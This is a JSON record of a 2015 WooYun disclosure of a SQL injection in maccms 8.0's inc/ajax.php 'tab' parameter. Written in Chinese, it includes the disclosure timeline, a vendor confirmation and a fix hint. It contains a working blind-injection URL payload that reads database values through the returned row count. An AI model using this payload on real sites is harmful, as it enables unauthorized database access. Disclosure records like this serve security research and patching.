{"id": 37694, "wybug_id": "wooyun-2015-099130", "wybug_title": "maccms8.0 注入漏洞", "wybug_corp": "maccms.com", "wybug_author": "蓝蓝", "wybug_date": "2015-03-05 15:50", "wybug_open_date": "2015-06-06 16:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-06：\t细节向公众公开  简要描述： maccms8.0 注入漏洞 详细说明：  漏洞代码在 inc/ajax.php首先通过封装的be方法取得tab参数\n\n直接把tab参数带入到了查询当中，因为注入点不在双引号内部，所以可以直接注入。\n\n这里需要一点小技巧让SQL语句不报错。payload如下：URL：http://10.1.157.64/maccms8_mfb/inc/ajax.php?ac=hits&tab=user,(select(1) as _hits,2 as _dayhits,3 as _weekhits , 4 as _monthhits ,5 as `_hitstime`from dual)temp where 2=1 -- a&id=2因为最后程序会把查询到的条数输出，所以形成了一个盲注。\n\n   漏洞证明：  演示如下：查询一下user()的第一个字符\n\n可以判断user()的第一个字符ascii码为 114 \n\n   修复方案：  backtick   版权声明：转载请注明来源 蓝蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-03-08 16:43 厂商回复： 已经确认，修复该问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}